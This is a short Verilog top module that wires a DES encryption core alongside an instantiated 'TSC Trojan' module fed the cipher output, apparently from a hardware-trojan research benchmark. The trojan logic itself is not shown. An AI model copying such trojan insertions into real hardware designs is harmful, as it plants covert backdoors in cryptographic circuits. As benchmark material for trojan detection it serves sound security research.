`timescale 1ns / 1ps

module top ( 
	  input clk, 
	  input rst, 
    input decrypt,
    input [3:0] roundSel,
    input [55:0] key,
    input [63:0] desIn,
    output [63:0] desOut
    ); 

	  des DES (clk, roundSel, decrypt, key, desIn, desOut); 
		TSC Trojan (clk, rst, desOut);

endmodule
